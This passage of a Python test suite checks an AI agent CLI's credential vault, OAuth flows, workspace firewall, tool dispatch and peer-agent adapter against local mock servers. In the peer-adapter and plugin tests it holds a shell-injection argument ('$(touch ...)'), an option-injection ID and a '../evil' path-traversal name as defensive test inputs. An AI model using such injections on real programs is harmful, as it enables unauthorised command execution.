                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(json.dumps({"access_token": "fresh_adc_token_v2", "expires_in": 3600}).encode("utf-8"))
                        return
                    if grant == "authorization_code":
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(
                            json.dumps(
                                {"access_token": "pkce_access_tok", "refresh_token": "pkce_ref_tok", "expires_in": 3600}
                            ).encode("utf-8")
                        )
                        return
                    if grant == "urn:ietf:params:oauth:grant-type:device_code":
                        state["device_polls"] += 1
                        if state["device_polls"] == 1:
                            self.send_response(400)
                            self.send_header("Content-Type", "application/json")
                            self.end_headers()
                            self.wfile.write(json.dumps({"error": "authorization_pending"}).encode("utf-8"))
                            return
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(
                            json.dumps({"access_token": "device_access_tok", "refresh_token": "dev_ref", "expires_in": 3600}).encode("utf-8")
                        )
                        return

                if self.path == "/oauth2/device":
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(
                        json.dumps(
                            {
                                "device_code": "dev_code_123",
                                "user_code": "ABCD-EFGH",
                                "verification_uri": "https://auth.example/activate",
                                "interval": 1,
                                "expires_in": 120,
                            }
                        ).encode("utf-8")
                    )
                    return

                # 3. Vertex endpoint returning 401 on stale token, 200 on refreshed token
                if ":streamGenerateContent" in self.path:
                    state["vtx_attempts"] += 1
                    auth_hdr = self.headers.get("Authorization", "")
                    if auth_hdr != "Bearer fresh_adc_token_v2":
                        self.send_response(401)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(b'{"error":{"code":401,"message":"UNAUTHENTICATED"}}')
                        return
                    self.send_response(200)
                    self.send_header("Content-Type", "text/event-stream")
                    self.end_headers()
                    evt = {
                        "candidates": [
                            {"content": {"role": "model", "parts": [{"text": "Refreshed 401 OK"}]}, "finishReason": "STOP"}
                        ]
                    }
                    self.wfile.write(f"data: {json.dumps(evt)}\n\n".encode("utf-8"))
                    return

                self.send_response(404)
                self.end_headers()

        srv = ThreadingHTTPServer(("127.0.0.1", 0), _FaultHandler)
        srv.daemon_threads = True
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        base = f"http://127.0.0.1:{srv.server_address[1]}"

        try:
            with tempfile.TemporaryDirectory() as tmp:
                root = pathlib.Path(tmp)
                adc_path = root / "adc.json"
                adc_path.write_text(
                    json.dumps(
                        {
                            "type": "authorized_user",
                            "client_id": "cid_test",
                            "client_secret": "csec_test",
                            "refresh_token": "rtok_test",
                            "token_uri": f"{base}/oauth2/token",
                        }
                    ),
                    encoding="utf-8",
                )
                with mock.patch.dict(
                    os.environ,
                    {
                        "USH_DISABLE_KEYCHAIN": "1",
                        "GOOGLE_APPLICATION_CREDENTIALS": str(adc_path),
                    },
                    clear=False,
                ):
                    vault = CredentialVault(root / "ush_home", probe_ambient=False)
                    sleeps: list[float] = []
                    client = UniversalModelClient(
                        vault,
                        HttpProviderTransport(vault),
                        max_api_attempts=4,
                        sleep_fn=lambda s: sleeps.append(s),
                    )

                    # 5a. Mid-connect socket drop recovery (`RemoteDisconnected` -> automatic reconnect)
                    flaky_prof = vault.register_api_key_profile(
                        "flaky",
                        "litellm",
                        "sk-flaky",
                        base_url=f"{base}/flaky-socket/v1",
                        default_model="gpt-4.1",
                    )
                    m_sock = client.generate(
                        profile=resolve_model_profile("litellm:gpt-4.1", "litellm"),
                        auth_profile=flaky_prof,
                        system_prompt="sys",
                        history=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hi")])],
                        tools=[],
                        session_id="s_sock",
                    )
                    self.assertEqual(m_sock.plain_text(), "Socket drop recovered")
                    self.assertEqual(state["drop_attempts"], 2)

                    # 5b. HTTP 401 -> `invalidate_token_cache` -> direct `authorized_user` ADC token refresh -> 200 OK
                    vtx_prof = vault.register_vertex_profile(
                        "vtx-adc",
                        project_id="proj-sec",
                        region="global",
                        base_url=base,
                    )
                    vault._gcloud_token_cache = ("stale_expired_token_v1", time.time() + 3600)
                    events: list[str] = []
                    m_401 = client.generate(
                        profile=resolve_model_profile("gemini-3.1-pro-preview", "vertex"),
                        auth_profile=vtx_prof,
                        system_prompt="sys",
                        history=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="refresh me")])],
                        tools=[],
                        session_id="s_401",
                        on_event=lambda e: events.append(str((e.meta or {}).get("event", ""))),
                    )
                    self.assertEqual(m_401.plain_text(), "Refreshed 401 OK")
                    self.assertIn("auth_refresh", events)
                    self.assertEqual(state["adc_refreshes"], 1)

                    # 5c. PKCE S256 math + CSRF `state` mismatch abort + valid headless callback exchange
                    verifier, challenge = generate_pkce_pair()
                    expected_chal = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode("ascii")).digest()).rstrip(b"=").decode("ascii")
                    self.assertEqual(challenge, expected_chal)

                    with contextlib.redirect_stdout(io.StringIO()):
                        with mock.patch("builtins.input", return_value="http://127.0.0.1:9999/oauth/callback?code=abc&state=TAMPERED"):
                            with self.assertRaises(RuntimeError):
                                run_oauth_pkce_login(
                                    vault,
                                    profile_name="pkce-tampered",
                                    provider="openai",
                                    authorize_url=f"{base}/oauth2/auth",
                                    token_url=f"{base}/oauth2/token",
                                    client_id="cid",
                                    scopes=["openid"],
                                    base_url=base,
                                    no_browser=True,
                                )

                        # Valid headless code input stores `0600` vault secret cleanly
                        with mock.patch("builtins.input", return_value="auth_code_ok_123"):
                            pkce_prof = run_oauth_pkce_login(
                                vault,
                                profile_name="pkce-ok",
                                provider="openai",
                                authorize_url=f"{base}/oauth2/auth",
                                token_url=f"{base}/oauth2/token",
                                client_id="cid",
                                scopes=["openid"],
                                base_url=base,
                                no_browser=True,
                            )
                        self.assertEqual(vault.resolve_bearer_or_key(pkce_prof), "pkce_access_tok")
                        mode_bits = vault.fallback_vault_path.stat().st_mode & 0o777
                        self.assertEqual(mode_bits, 0o600)

                        # 5d. RFC 8628 Device-Code flow (`authorization_pending` -> `access_token`)
                        with mock.patch("ush.auth.vault.time.sleep", return_value=None):
                            dev_prof = run_oauth_device_code_login(
                                vault,
                                profile_name="dev-ok",
                                provider="openai",
                                device_code_url=f"{base}/oauth2/device",
                                token_url=f"{base}/oauth2/token",
                                client_id="cid",
                                scopes=["openid"],
                                base_url=base,
                            )
                    self.assertEqual(vault.resolve_bearer_or_key(dev_prof), "device_access_tok")
                    self.assertEqual(state["device_polls"], 2)
        finally:
            srv.shutdown()
            srv.server_close()

    # =========================================================================
    # 6. Built-In Tool Boundaries & Headless CLI `-p` Contracts
    # =========================================================================

    def test_builtin_tools_completeness_and_headless_cli_contracts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp).resolve()
            ws = root / "ws"
            ext_skill_root = root / "external_skills" / "sec-audit"
            home = root / "ush_home"
            ws.mkdir()
            (ext_skill_root / "references").mkdir(parents=True)
            (ext_skill_root / "SKILL.md").write_text(
                "---\nname: sec-audit\ndescription: Security audit helper\n---\nCheck `references/checklist.md`.\n",
                encoding="utf-8",
            )
            checklist_file = ext_skill_root / "references" / "checklist.md"
            checklist_file.write_text("# Checklist\n- Verify mTLS\n", encoding="utf-8")

            # Put a secret in `.env` containing `NEEDLE_TOKEN` and a normal source file containing `NEEDLE_TOKEN`
            (ws / ".env").write_text("API_SECRET=NEEDLE_TOKEN\n", encoding="utf-8")
            (ws / "engine.py").write_text(
                'class WidgetEngine:\n    """Core widget engine."""\n    def compute_score(self, x: int) -> int:\n        # NEEDLE_TOKEN ref\n        return x * 2\n\n'
                "def run_widget() -> int:\n    return WidgetEngine().compute_score(21)\n",
                encoding="utf-8",
            )
            # Tiny valid 1x1 PNG
            png_bytes = base64.b64decode(
                "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
            )
            (ws / "pixel.png").write_bytes(png_bytes)

            fw = SecurityFirewall(ws)
            sk_mgr = SkillManager(
                ws,
                ush_home=home,
                is_workspace_trusted=True,
                extension_skill_dirs=[root / "external_skills"],
                include_user_ecosystem_dirs=False,
            )
            # External skill outside workspace: before `activate_skill`, reading `checklist_file` is blocked!
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate(checklist_file)

            reg = build_default_tool_registry()
            pty = PersistentPtyManager(ws)
            try:
                def _ctx(cid: str, ask_cb=None) -> ToolExecutionContext:
                    return ToolExecutionContext(
                        call_id=cid,
                        firewall=fw,
                        stale_tracker=StaleReadTracker(),
                        pty=pty,
                        policy_engine=PolicyEngine(),
                        mode=PermissionMode.YOLO,
                        ask_user_callback=ask_cb,
                        skill_activate_callback=lambda name: sk_mgr.activate(name, fw),
                    )

                batch_out = reg.dispatch_batch(
                    [
                        CanonicalPart(kind="tool_call", tool_call_id="t1", tool_name="glob_files", tool_args={"pattern": "*.py", "skeleton": True}),
                        CanonicalPart(kind="tool_call", tool_call_id="t2", tool_name="grep_files", tool_args={"pattern": "NEEDLE_TOKEN"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t3", tool_name="lsp_query", tool_args={"action": "references", "symbol": "compute_score"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t4", tool_name="read_file", tool_args={"path": "pixel.png"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t5", tool_name="activate_skill", tool_args={"name": "sec-audit"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t6", tool_name="write_file", tool_args={"path": "notes/out.txt", "content": "written atomically\n"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t7", tool_name="ask_user", tool_args={"question": "Proceed?", "options": ["yes", "no"]}),
                    ],
                    _ctx,
                )
                self.assertIn("class WidgetEngine", batch_out[0].text)
                self.assertIn("engine.py", batch_out[1].text)
                # `.env` MUST NEVER appear in `grep_files` output!
                self.assertNotIn(".env", batch_out[1].text)
                self.assertIn("engine.py:", batch_out[2].text)
                self.assertEqual(batch_out[3].mime_type, "image/png")
                self.assertTrue(bool(batch_out[3].base64_data))
                self.assertIn("sec-audit", batch_out[4].text)
                # After `activate_skill`, bundled `references/checklist.md` outside workspace is now readable!
                self.assertEqual(fw.resolve_and_validate(checklist_file), checklist_file.resolve())
                self.assertEqual((ws / "notes" / "out.txt").read_text(encoding="utf-8"), "written atomically\n")
                self.assertIn("Autonomous headless mode", batch_out[6].text)
            finally:
                pty.close_all()

            # --- Headless CLI (`crux -p --output-format text|json|stream-json` & `crux doctor`) ---
            def _fake_stream_turn(
                _self_tp: HttpProviderTransport,
                *,
                profile: ModelCapabilityProfile,
                auth_profile: AuthProfile,
                system_prompt: str,
                messages: list[CanonicalMessage],
                tools: list[dict[str, Any]],
                session_id: str,
                on_event=None,
            ) -> CanonicalMessage:
                u_txt = messages[-1].plain_text()
                if "FAIL_WITH_KEY" in u_txt:
                    raise WireError(422, "Upstream validation error with sk-proj-SECRETKEY0123456789abcdefghij")
                if on_event:
                    from ush.core.types import StreamEvent

                    on_event(StreamEvent(kind="text_delta", text="Headless OK"))
                return CanonicalMessage(
                    role="assistant",
                    producer_provider=profile.provider,
                    producer_model_id=profile.model_id,
                    parts=[CanonicalPart(kind="text", text="Headless OK")],
                )

            with mock.patch.dict(
                os.environ,
                {
                    "USH_HOME": str(home),
                    "USH_DISABLE_KEYCHAIN": "1",
                    "GEMINI_API_KEY": "AIzaMockKey123456789012345678901234",
                },
                clear=False,
            ):
                # `crux doctor` smoke check
                doc_out = io.StringIO()
                with mock.patch("sys.stdout", doc_out):
                    rc_doc = cli_main(["-C", str(ws), "doctor"])
                self.assertEqual(rc_doc, 0)
                self.assertIn("Health Check", doc_out.getvalue())

                with mock.patch.object(HttpProviderTransport, "stream_turn", _fake_stream_turn):
                    # 1. `--output-format json` schema check
                    json_out = io.StringIO()
                    with mock.patch("sys.stdout", json_out):
                        rc_j = cli_main(["-C", str(ws), "-p", "hello json", "--output-format", "json"])
                    self.assertEqual(rc_j, 0)
                    parsed_j = json.loads(json_out.getvalue())
                    self.assertEqual(parsed_j["response"], "Headless OK")
                    self.assertEqual(parsed_j["stop_reason"], "STOP")
                    self.assertIn("session_id", parsed_j)

                    # 2. `--output-format stream-json` NDJSON event check
                    sjson_out = io.StringIO()
                    with mock.patch("sys.stdout", sjson_out):
                        rc_sj = cli_main(["-C", str(ws), "-p", "hello stream", "--output-format", "stream-json"])
                    self.assertEqual(rc_sj, 0)
                    frames = [json.loads(ln) for ln in sjson_out.getvalue().splitlines() if ln.strip()]
                    self.assertTrue(any(f.get("type") == "text_delta" and f.get("text") == "Headless OK" for f in frames))

                    # 3. Error path redacts leaked API keys in JSON output and returns exit code 1
                    err_out = io.StringIO()
                    with mock.patch("sys.stdout", err_out):
                        rc_err = cli_main(["-C", str(ws), "-p", "FAIL_WITH_KEY", "--output-format", "json"])
                    self.assertEqual(rc_err, 1)
                    parsed_err = json.loads(err_out.getvalue())
                    self.assertNotIn("sk-proj-", parsed_err["error"])
                    self.assertIn("[REDACTED_SECRET]", parsed_err["error"])

    # =========================================================================
    # 7. Code Assist (`v1internal:loadCodeAssist` + `session_id` Cache Affinity)
    # =========================================================================

    def test_code_assist_load_project_and_session_affinity(self) -> None:
        load_calls: list[dict[str, Any]] = []
        stream_calls: list[dict[str, Any]] = []

        class _CodeAssistHandler(BaseHTTPRequestHandler):
            def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
                return

            def do_POST(self) -> None:  # noqa: N802
                length = int(self.headers.get("Content-Length", "0"))
                body = json.loads(self.rfile.read(length).decode("utf-8"))
                self.assert_ua = self.headers.get("User-Agent", "")
                if self.path == "/v1internal:loadCodeAssist":
                    load_calls.append({"headers": dict(self.headers.items()), "body": body})
                    resp = json.dumps({"cloudaicompanionProject": "companion-proj-42"}).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(resp)))
                    self.end_headers()
                    self.wfile.write(resp)
                    return
                if self.path == "/v1internal:streamGenerateContent?alt=sse":
                    stream_calls.append({"headers": dict(self.headers.items()), "body": body})
                    sse_chunk = (
                        "data: "
                        + json.dumps(
                            {
                                "response": {
                                    "candidates": [
                                        {
                                            "content": {"role": "model", "parts": [{"text": "CODE_ASSIST_OK"}]},
                                            "finishReason": "STOP",
                                        }
                                    ],
                                    "usageMetadata": {"promptTokenCount": 12, "candidatesTokenCount": 4},
                                }
                            }
                        )
                        + "\n\n"
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/event-stream")
                    self.send_header("Connection", "close")
                    self.end_headers()
                    self.wfile.write(sse_chunk)
                    return
                self.send_response(404)
                self.end_headers()

        srv = ThreadingHTTPServer(("127.0.0.1", 0), _CodeAssistHandler)
        port = srv.server_address[1]
        th = threading.Thread(target=srv.serve_forever, daemon=True)
        th.start()
        try:
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
                os.environ, {"USH_DISABLE_KEYCHAIN": "1"}, clear=False
            ):
                vault = CredentialVault(pathlib.Path(tmp) / "ush", probe_ambient=False)
                prof = vault.register_api_key_profile(
                    name="ca-test",
                    provider="gemini-enterprise",
                    api_key="ya29.mock_ca_bearer_token",
                    base_url=f"http://127.0.0.1:{port}",
                    auth_kind="bearer",
                    api_mode="code_assist",
                    project_id=None,
                )
                mprof = resolve_model_profile("gemini-2.5-pro", "gemini-enterprise")
                transport = HttpProviderTransport(vault)
                user_msg = CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="ping")])

                msg1 = transport.stream_turn(
                    profile=mprof,
                    auth_profile=prof,
                    system_prompt="sys",
                    messages=[user_msg],
                    tools=[],
                    session_id="sess_ca_affinity_01",
                )
                msg2 = transport.stream_turn(
                    profile=mprof,
                    auth_profile=prof,
                    system_prompt="sys",
                    messages=[user_msg],
                    tools=[],
                    session_id="sess_ca_affinity_01",
                )
                self.assertEqual(msg1.plain_text(), "CODE_ASSIST_OK")
                self.assertEqual(msg2.plain_text(), "CODE_ASSIST_OK")
                # `:loadCodeAssist` runs once and caches companion project for subsequent turns
                self.assertEqual(len(load_calls), 1)
                self.assertEqual(load_calls[0]["body"]["metadata"]["ideType"], "IDE_UNSPECIFIED")
                self.assertEqual(load_calls[0]["body"]["metadata"]["pluginType"], "GEMINI")
                self.assertEqual(load_calls[0]["headers"].get("User-Agent"), "crux-cli/0.1")
                self.assertEqual(len(stream_calls), 2)
                for sc in stream_calls:
                    self.assertEqual(sc["body"].get("project"), "companion-proj-42")
                    self.assertEqual(sc["body"]["request"].get("session_id"), "sess_ca_affinity_01")
        finally:
            srv.shutdown()
            srv.server_close()
            th.join(timeout=2)

    # =========================================================================
    # 8. External Peer Agent CLI Adapter (`agentapi` / `USH_PEER_AGENT_BIN`)
    # =========================================================================

    def test_external_peer_cli_adapter_and_env_hygiene(self) -> None:
        from ush.swarm.engine import ExternalAgentCliAdapter

        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp)
            ws = root / "ws"
            home = root / "home"
            ws.mkdir()
            pwn_marker = ws / "pwned.txt"
            mock_bin = root / "mock_agentapi.py"
            mock_bin.write_text(
                "#!/usr/bin/env python3\n"
                "import json, os, sys\n"
                "if 'ANTIGRAVITY_SOURCE_METADATA' in os.environ or 'OPENAI_API_KEY' in os.environ:\n"
                "    sys.stderr.write('LEAKED_ENV')\n"
                "    sys.exit(9)\n"
                "cmd = sys.argv[1]\n"
                "if cmd == 'new-conversation':\n"
                "    print('12345678-1234-4321-8765-123456789abc')\n"
                "elif cmd == 'send-message':\n"
                "    print(f'SENT:{sys.argv[2]}:{sys.argv[3]}')\n"
                "elif cmd == 'get-conversation-metadata':\n"
                "    print(json.dumps({'id': sys.argv[2], 'status': 'DONE'}))\n",
                encoding="utf-8",
            )
            os.chmod(mock_bin, 0o700)

            with mock.patch.dict(
                os.environ,
                {
                    "USH_HOME": str(home),
                    "USH_DISABLE_KEYCHAIN": "1",
                    "USH_PEER_AGENT_BIN": str(mock_bin),
                    "ANTIGRAVITY_SOURCE_METADATA": "cross-project-blob",
                    "OPENAI_API_KEY": "sk-proj-SHOULD_NEVER_LEAK_TO_PEER_CLI",
                    "GEMINI_API_KEY": "AIzaMockKey123456789012345678901234",
                },
                clear=False,
            ):
                adapter = ExternalAgentCliAdapter(default_cwd=ws)
                self.assertTrue(adapter.is_available())

                # Shell metacharacters are passed literally via `shell=False`
                r_new = adapter.new_conversation(f"Audit $(touch {pwn_marker}); echo literal")
                self.assertEqual(r_new.returncode, 0)
                self.assertEqual(r_new.conversation_id, "12345678-1234-4321-8765-123456789abc")
                self.assertFalse(pwn_marker.exists())

                r_send = adapter.send_message(r_new.conversation_id, "Follow-up task")
                self.assertEqual(r_send.returncode, 0)
                self.assertIn("SENT:12345678-1234-4321-8765-123456789abc:Follow-up task", r_send.output)

                r_meta = adapter.get_metadata(r_new.conversation_id)
                self.assertEqual(r_meta.returncode, 0)
                self.assertEqual(r_meta.metadata, {"id": "12345678-1234-4321-8765-123456789abc", "status": "DONE"})

                # Reject option-injection conversation IDs
                with self.assertRaises(ValueError):
                    adapter.send_message("--malicious-flag", "hi")

                # End-to-end CLI `crux swarm --peer-cli ... --output-format json`
                buf = io.StringIO()
                with mock.patch("sys.stdout", buf):
                    rc = cli_main(["-C", str(ws), "swarm", "--peer-cli", "Delegate check", "--output-format", "json"])
                self.assertEqual(rc, 0)
                cli_payload = json.loads(buf.getvalue())
                self.assertEqual(cli_payload["conversation_id"], "12345678-1234-4321-8765-123456789abc")

    # =========================================================================
    # 9. Host-Local Workstation Adapter (`auth_kind="command"`, Gate & Plugins)
    # =========================================================================

    def test_workstation_command_auth_host_gate_and_local_plugin_permissions(self) -> None:
        seen_auth_headers: list[str] = []

        class _TokenGateHandler(BaseHTTPRequestHandler):
            def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
                return

            def do_POST(self) -> None:  # noqa: N802
                _ = self.rfile.read(int(self.headers.get("Content-Length", "0")))
                auth_h = self.headers.get("Authorization", "")
                seen_auth_headers.append(auth_h)
                if auth_h == "Bearer tok_stale_1":
                    self.send_response(401)
                    self.send_header("Connection", "close")
                    self.end_headers()
                    self.wfile.write(b'{"error": "token expired"}')
                    return
                sse = (
                    "data: "
                    + json.dumps(
                        {
                            "choices": [{"delta": {"content": "WORKSTATION_OK"}, "finish_reason": "stop"}],
                            "usage": {"prompt_tokens": 5, "completion_tokens": 2},
                        }
                    )
                    + "\n\n"
                ).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/event-stream")
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(sse)

        srv = ThreadingHTTPServer(("127.0.0.1", 0), _TokenGateHandler)
        port = srv.server_address[1]
        th = threading.Thread(target=srv.serve_forever, daemon=True)
        th.start()
        try:
            with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
                os.environ, {"USH_DISABLE_KEYCHAIN": "1"}, clear=False
            ):
                root = pathlib.Path(tmp)
                ush_home = root / "ush_home"
                ws = root / "repo"
                ws.mkdir()

                # 1. `workstation.json` is blocked inside workspace by `SecurityFirewall`
                (ws / "workstation.json").write_text('{"profiles": []}', encoding="utf-8")
                fw = SecurityFirewall(ws)
                with self.assertRaises(PermissionError):
                    fw.resolve_and_validate("workstation.json")

                # 2. Token helper script rotating from `tok_stale_1` -> `tok_fresh_2`
                counter_file = root / "tok_counter.txt"
                helper_py = root / "token_helper.py"
                helper_py.write_text(
                    "import json, pathlib\n"
                    f"p = pathlib.Path({str(counter_file)!r})\n"
                    "n = int(p.read_text()) + 1 if p.exists() else 1\n"
                    "p.write_text(str(n))\n"
                    "tok = 'tok_stale_1' if n == 1 else f'tok_fresh_{n}'\n"
                    "print(json.dumps({'access_token': tok, 'expires_in': 3600}))\n",
                    encoding="utf-8",
                )

                marker_path = root / "workstation_marker"
                vault = CredentialVault(ush_home, probe_ambient=False)
                vault.register_api_key_profile(
                    name="public-fallback",
                    provider="openai",
                    api_key="sk-public-fallback-key",
                    base_url=f"http://127.0.0.1:{port}/v1",
                    api_mode="chat_completions",
                )
                ws_prof = vault.register_command_profile(
                    name="corp-workstation",
                    provider="openai",
                    credential_command=f"{os.sys.executable} {helper_py}",
                    base_url=f"http://127.0.0.1:{port}/v1",
                    api_mode="chat_completions",
                    require_host_path=str(marker_path),
                    persist_to_workstation_overlay=True,
                )

                # Workstation profile stays strictly in `workstation.json` (0600), NOT in `auth_profiles.json`
                saved_main = json.loads((ush_home / "auth_profiles.json").read_text(encoding="utf-8"))
                self.assertEqual([p["name"] for p in saved_main["profiles"]], ["public-fallback"])
                self.assertEqual((ush_home / "workstation.json").stat().st_mode & 0o777, 0o600)

                # Host gate inactive (`marker_path` missing) -> automatically falls back to `public-fallback`!
                self.assertFalse(ws_prof.is_available())
                self.assertEqual(vault.get_active_profile().name, "public-fallback")

                # Create host marker -> `corp-workstation` becomes eligible & active!
                marker_path.write_text("1", encoding="utf-8")
                vault_reloaded = CredentialVault(ush_home, probe_ambient=False)
                active_ws = vault_reloaded.get_active_profile()
                self.assertIsNotNone(active_ws)
                self.assertEqual(active_ws.name, "corp-workstation")

                # Cached token is reused before 401, then invalidated & refreshed automatically on HTTP 401!
                self.assertEqual(vault_reloaded.resolve_bearer_or_key(active_ws), "tok_stale_1")
                self.assertEqual(vault_reloaded.resolve_bearer_or_key(active_ws), "tok_stale_1")
                client = UniversalModelClient(
                    vault=vault_reloaded,
                    transport=HttpProviderTransport(vault_reloaded),
                    sleep_fn=lambda _: None,
                )
                mprof = resolve_model_profile("gpt-4.1", "openai")
                reply = client.generate(
                    profile=mprof,
                    auth_profile=active_ws,
                    system_prompt="sys",
                    history=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hi")])],
                    tools=[],
                    session_id="sess_ws_01",
                )
                self.assertEqual(reply.plain_text(), "WORKSTATION_OK")
                self.assertEqual(seen_auth_headers, ["Bearer tok_stale_1", "Bearer tok_fresh_2"])

                # 3. World-writable `workstation.json` (`0666`) is refused with security warning
                os.chmod(ush_home / "workstation.json", 0o666)
                vault_bad = CredentialVault(ush_home, probe_ambient=False)
                self.assertNotIn("corp-workstation", [p.name for p in vault_bad.list_profiles()])
                self.assertTrue(any("workstation.json" in w for w in vault_bad.security_warnings))
                os.chmod(ush_home / "workstation.json", 0o600)

                # 4. Host-local `~/.ush/providers/<plugin>.py` loader & permission enforcement
                prov_dir = ush_home / "providers"
                prov_dir.mkdir(mode=0o700)
                plugin_file = prov_dir / "custom_gw.py"
                plugin_file.write_text(
                    "from ush.core.types import CanonicalMessage, CanonicalPart, StopReason\n"
                    "def stream_turn(*, profile, auth_profile, token, session_id, **kwargs):\n"
                    "    return CanonicalMessage(\n"
                    "        role='assistant',\n"
                    "        producer_provider=auth_profile.provider,\n"
                    "        producer_model_id=profile.model_id,\n"
                    "        parts=[CanonicalPart(kind='text', text=f'PLUGIN:{token}:{session_id}')],\n"
                    "        stop_reason=StopReason.STOP,\n"
                    "    )\n",
                    encoding="utf-8",
                )
                # Group/world-writable plugin (`0666`) MUST raise PermissionError
                os.chmod(plugin_file, 0o666)
                with self.assertRaises(PermissionError):
                    load_local_transport_plugin(ush_home, "custom_gw")

                # Path traversal name MUST raise ValueError
                with self.assertRaises(ValueError):
                    load_local_transport_plugin(ush_home, "../evil")

                # Proper `0600` plugin executes cleanly through `HttpProviderTransport`
                os.chmod(plugin_file, 0o600)
                plug_prof = AuthProfile(
                    name="custom-gw-prof",
                    provider="custom_gw",
                    auth_kind="bearer",
                    base_url="https://localhost",
                    source="workstation",
                    transport_plugin="custom_gw",
                )
                vault_reloaded.store_secret("custom-gw-prof", mock.MagicMock(to_json=lambda: '{"access_token": "plug_tok"}'))
                plug_msg = HttpProviderTransport(vault_reloaded).stream_turn(
                    profile=mprof,
                    auth_profile=plug_prof,
                    system_prompt="sys",
                    messages=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hi")])],
                    tools=[],
                    session_id="sess_plug_99",
                )
                self.assertEqual(plug_msg.plain_text(), "PLUGIN:plug_tok:sess_plug_99")

                # Non-local (`env:*`) profile attempting `transport_plugin` is refused
                env_evil = AuthProfile(
                    name="env-evil",
                    provider="openai",
                    auth_kind="none",
                    base_url="https://localhost",
                    source="env:OPENAI_API_KEY",
                    transport_plugin="custom_gw",
                )
                with self.assertRaises(PermissionError):
                    HttpProviderTransport(vault_reloaded).stream_turn(
                        profile=mprof,
                        auth_profile=env_evil,
                        system_prompt="sys",
                        messages=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hi")])],
                        tools=[],
                        session_id="sess_evil",
                    )
        finally:
            srv.shutdown()
            srv.server_close()
            th.join(timeout=2)

    # =========================================================================
    # 10. Zero-Project Google OAuth (Ultra / Pro / Code Assist `:onboardUser` LRO)
    # =========================================================================

    def test_google_oauth_pkce_loopback_and_projectless_ultra_onboarding(self) -> None:
        from ush.auth.vault import resolve_google_oauth_client_credentials, setup_code_assist_user

        ca_state = {"mode": "ultra_existing", "lro_polls": 0, "onboard_bodies": []}

        class _ZeroProjectCAHandler(BaseHTTPRequestHandler):
            def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
                return

            def do_GET(self) -> None:  # noqa: N802
                if self.path == "/v1internal/operations/onboard-op-99":
                    ca_state["lro_polls"] += 1
                    done = ca_state["lro_polls"] >= 2
                    payload: dict[str, Any] = {"name": "operations/onboard-op-99", "done": done}
                    if done:
                        payload["response"] = {"cloudaicompanionProject": {"id": "managed-ultra-proj-777"}}
                    raw = json.dumps(payload).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(raw)))
                    self.end_headers()
                    self.wfile.write(raw)
                    return
                self.send_response(404)
                self.end_headers()

            def do_POST(self) -> None:  # noqa: N802
                length = int(self.headers.get("Content-Length", "0"))
                raw_in = self.rfile.read(length).decode("utf-8")
                if self.path == "/oauth2/token":
                    form = urllib.parse.parse_qs(raw_in)
                    if (form.get("client_secret") or [""])[0] != "installed_app_csec":
                        self.send_response(401)
                        self.end_headers()
                        return
                    tok_resp = json.dumps(
                        {
                            "access_token": "ya29.ultra_oauth_access",
                            "refresh_token": "1//ultra_oauth_refresh",
                            "expires_in": 3600,
                        }
                    ).encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", str(len(tok_resp)))
                    self.end_headers()
                    self.wfile.write(tok_resp)
                    return

                body = json.loads(raw_in) if raw_in else {}
                if self.path == "/v1internal:loadCodeAssist":
                    if ca_state["mode"] == "ultra_existing":
                        resp_obj: dict[str, Any] = {
                            "currentTier": {"id": "standard-tier", "name": "Gemini Code Assist"},
                            "paidTier": {
                                "id": "ultra-tier",
                                "name": "Google AI Ultra",
                                "availableCredits": [{"creditType": "GOOGLE_ONE_AI", "creditAmount": "2500"}],
                            },
                            "cloudaicompanionProject": "managed-ultra-proj-001",
                        }
                    elif ca_state["mode"] == "first_time_onboard":
                        resp_obj = {
                            "allowedTiers": [{"id": "free-tier", "name": "Individual", "isDefault": True}],
                            "paidTier": {
                                "id": "ultra-tier",
                                "name": "Google AI Ultra",
                                "availableCredits": [{"creditType": "GOOGLE_ONE_AI", "creditAmount": "5000"}],
                            },
                        }
                    elif ca_state["mode"] == "managed_org_needs_onboard":
                        resp_obj = {
                            "allowedTiers": [
                                {
                                    "id": "standard-tier",
                                    "name": "Standard",
                                    "isDefault": True,
                                    "userDefinedCloudaicompanionProject": True,
                                }
                            ],
                            "cloudaicompanionProject": "managed-org-proj-55",
                        }
                    else:  # dasher_corp_requires_project
                        resp_obj = {
